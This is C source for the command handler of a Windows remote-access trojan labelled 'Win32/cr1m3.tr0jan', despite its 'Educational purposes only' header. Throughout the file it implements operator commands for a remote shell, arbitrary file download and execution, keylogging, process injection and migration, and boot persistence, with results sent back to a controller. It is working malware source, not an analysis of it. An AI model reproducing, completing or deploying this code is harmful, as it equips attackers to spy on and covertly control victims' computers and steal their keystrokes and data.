/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#include "misc.h"
#include "api.h"
#include "info.h"
#include "process.h"
#include "task_reply.h"
#include "http.h"
#include "shell.h"
#include "base64.h"
#include "inject.h"
#include "persistence.h"
#include "keylogger.h"
#include "command.h"


struct command commands[] = {
		{"^shell", &cc_shell}, // OK but need use UNICODE to read special chars
		{"^owned", &cc_owned}, // OK
		{"^execute", &cc_execute}, // OK
		{"^escalate", &cc_escalate},
		{"^migration", &cc_migration}, // PARTIAL (Windows 7SP1 and 8.1 32bits tested) this implementation only found in x86
		{"^download", &cc_download},  // OK
		{"^keylogger", &cc_keylogger},  // PARTIAL
		{"^process", &cc_process},  // OK
		{"^upload", &cc_upload},   // NO
		{"^persistence", &cc_persistence}, // OK
		{"^infect", &cc_null}, // OK
		{"^screenshot", &cc_screenshot}, //NO
		{"^exit", &cc_exit},
		{"^cd", &cc_null },
		{"^rootkit", &cc_null},	// OK
		{"^reflectdll", &cc_null },
		{"^injectdll", &cc_null },
		{"^downloadexec", &cc_null }

};

int cc_null(cmd_data *data) {
	__asm {
		nop
	}
}


//KEYLOGGER
int cc_keylogger(cmd_data *data) {
	if(__keylogger_start()==1) {
		__push_reply("Keylogger start: OK",2);
		return 1;
	}
	if(_lstrlenA(data->arg)>1) {
		if(_lstrcmpiA(data->arg, "exit")==0x00) {
			if(__keylogger_stop()==0x01) {
				__push_reply("Keylogger stop: OK", OPTION_BOTSHELL);
				return 1;
			}
			else {
				__push_reply("Keylogger stop: ERROR", OPTION_BOTSHELL);
				return 0;
			}
		}
	}

	__push_reply("Keylogger start: NO", OPTION_BOTSHELL);
	return 0;
}


//PROCESS MIGRATION
int cc_migration(cmd_data *data) {
	__inject_migration(__atoi(data->arg),NULL);
	return 0;
}


//PROCESS LIST
int cc_process(cmd_data *data) {
	proc_struct proc;
	char *reply = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000003, 2048);
	int i = 0;

	__process_list();

	__push_reply("\tProcess listing...", OPTION_BOTSHELL); //output shell

	while(__get_process(&proc, i)==1) {
		_snprintf(reply, 200, "%s###%d", proc.process, proc.procid);	
		__push_reply(reply, OPTION_PROCESS); //output process table
		_ZeroMemory(reply, 2048);
		i++;
	}

	if(i>2)
		__push_reply("\t\t\t[OK]\n", OPTION_BOTSHELL);
	else
		__push_reply("\t\t\t[ERROR]\n", OPTION_BOTSHELL);


	_HeapFree(_GetProcessHeap(), 0x00000001, reply);
	return 1;
}

// REGISTER
int cc_relogin(cmd_data *data) {
	info s_info;
	char *reply = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000003, 2048);

	__get_info(&s_info);
	_snprintf(reply, _lstrlenA(s_info.user_name)+_lstrlenA(s_info.os_version)+1, "%s#%s", s_info.user_name,s_info.os_version);
	__push_reply(reply, OPTION_BOTSHELL);
	return 0;
}



//Execute Command
int cc_execute(cmd_data *data) {
	char *proc_file;
	char *dir_file;
	int i				=	__get_last_char(data->arg, '\\');
	int ret				=	0x0;
	unsigned long a;




	if(i!=0) {
		proc_file		=	_HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);
		dir_file		=	_HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);
		_lstrcpyA(proc_file, __get_last_char_pointer(data->arg, '\\'));
		_lstrcpynA(dir_file, data->arg, i+2);
		a = (unsigned long)_ShellExecuteA(0x00, 0x00, proc_file, 0x00, dir_file, 0x00);

		__push_reply(proc_file, 2);
		__push_reply("\tExecute...", 2);

		if(a>=4) {
			__push_reply("\t\t\t[OK]\n",2);
			ret=1;
		}	
		else {
			__push_reply("\t\t\t[ERROR]\n",2);
		}
		_ZeroMemory(proc_file, _lstrlenA(proc_file));
		_ZeroMemory(dir_file, _lstrlenA(dir_file));
		_HeapFree(_GetProcessHeap(), 0x00000001, proc_file);
		_HeapFree(_GetProcessHeap(), 0x00000001, dir_file);
	}
	else {
		a = (unsigned long)_ShellExecuteA(0x00, 0x00, data->arg, 0x00, 0x00, 0x00);
		__push_reply(data->arg, 2);
		__push_reply("\tExecute...", 2);

		if(a>=sizeof(int)) {
			
			__push_reply("\t\t\t[OK]\n", 2);
			ret=1;
		}
		else {
			__push_reply("\t\t\t[ERROR]\n", 2);
		}	


	}

	return(ret);

}


// SHELL COMMAND
int cc_shell(cmd_data *data) {
	__shell_new(data->arg);
	//	__shell_write(data->arg);
	//__shell_close();
	//__shell_write(data->arg);
	//__shell_read();
	return 1;
	
}

// DOWNLOAD
int cc_download(cmd_data *data) {
		char *ptr;
		ptr = __get_last_char_pointer(data->arg, '/');
		
		if(ptr) {
			if(ptr && _lstrlenA(ptr)>=1 && _lstrlenA(ptr)<=256) {
					__push_reply(ptr, OPTION_BOTSHELL);
					__push_reply("\tDownloading... ",2);
					
			}
			else {
					__push_reply("\nDownload: File name error\n", OPTION_BOTSHELL);
					return 0;
			}

			if(_URLDownloadToFileA(NULL, data->arg, ptr, NULL, NULL)==0x00000000) {
					__push_reply("\t\t\t[OK]\n",2);
			}
			else {
					__push_reply("\t\t\t[ERROR]\n",2);
					return 0;
			}
		}

		return 1;
}

// OWNED (FUNNY MESSAGE)
int cc_owned(cmd_data *data) {
	_MessageBoxA(_GetForegroundWindow(), (unsigned char *)data->arg, (unsigned char *)"@cr1m3//JennyLab", 0x00);
	__push_reply("Happy Command: Executed\n", OPTION_BOTSHELL);
	return 1;
}


// EXIT
int cc_exit(cmd_data *data) {
	_ExitProcess(0x00);
	return 1;
}





int cc_persistence(cmd_data *data) {  
	if(__persistence()==0x01) {
		__push_reply("Persistence next reboot: OK\n", OPTION_BOTSHELL);
		return 1;
	}

	__push_reply("Persistence ERROR\n", 2);
	return 0; 

}

int cc_upload(cmd_data *data) {	return 0; }	
int cc_escalate(cmd_data *data) { return 0; }
int cc_screenshot(cmd_data *data) { return 0; }



int __command_free(cmd_data *data) {
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, data->cmd);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, data->arg);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, data->token);
	return(0);
}




int __command_initialize(cmd_data *data) {
	if ((data->cmd = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMMAND_LEN)) == NULL)
		return(0xFFFFFFFF);
	if ((data->arg = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_ARGUMENT_LEN)) == NULL)
		return(0xFFFFFFFF);
	if ((data->token = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_TOKEN_LEN)) == NULL)
		return(0xFFFFFFFF);

	return(0);
}




/**
 * @brief Command parser
 * @param raw_command input original encoded string
 * @param cmd_data point to command struct 
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
// return 0xFFFFFFFF if unrecognize format
int __command_parser(char *raw_command, cmd_data *data) {
	char *tmp;
	int i = 0;

	int ret = 0xFFFFFFFF;

	if(raw_command[0]!=COMMAND_PREFIX) {
		return(ret);
	}

	
	if((tmp=__strtok((char *)raw_command, COMMAND_DELIMITER))!=0x00)
		if(_lstrlenA(tmp)<=MAX_COMMAND_LEN)
			_lstrcpynA(data->cmd, tmp, _lstrlenA(tmp)+0x01);
			

	while((tmp=__strtok(0x00, COMMAND_DELIMITER))!=0x00) {
		switch(i) {
			case 0:
				if(_lstrlenA(tmp)<=MAX_ARGUMENT_LEN) {
					_lstrcpynA(data->arg, tmp, _lstrlenA(tmp)+0x01);
				}
				break;	
			case 1:
				if(_lstrlenA(tmp)<=MAX_TOKEN_LEN) {
					_lstrcpynA(data->token, tmp, _lstrlenA(tmp)+1);
				}
			default:
				break;
		}

		i++;
	} 
		
		
	return(0);

}


int __command_control(cmd_data *data) {
		int i =0;
		cmd_data sh_dat;
		char *ptr=data->cmd;
		char *out;
	
		for(i=0;i<=MAX_COMMANDS;i++) {
                if(_lstrcmpiA(data->cmd,commands[i].cmd)==0) {
					if(commands[i].func(data)==0x00) {
                        __push_reply("Command error or not successfully executed\n",2);
						return(0);
					}
					return(1);
                }
        }

		
		out = __alloc(4096);
		ptr++;
		
		if (data->arg != NULL && _lstrlenA(data->arg) > 0) {
			if ((_lstrlenA(data->arg) + _lstrlenA(data->cmd)) > 4096) {
				__push_reply("Max size too long: ", OPTION_BOTSHELL);
			}
			else {
				_snprintf(out, 4096, "%s %s", ptr, data->arg);
				ptr = out;
			}
				
		}

		__shell_new(ptr);
		__free(out);
		return 0;
		
}
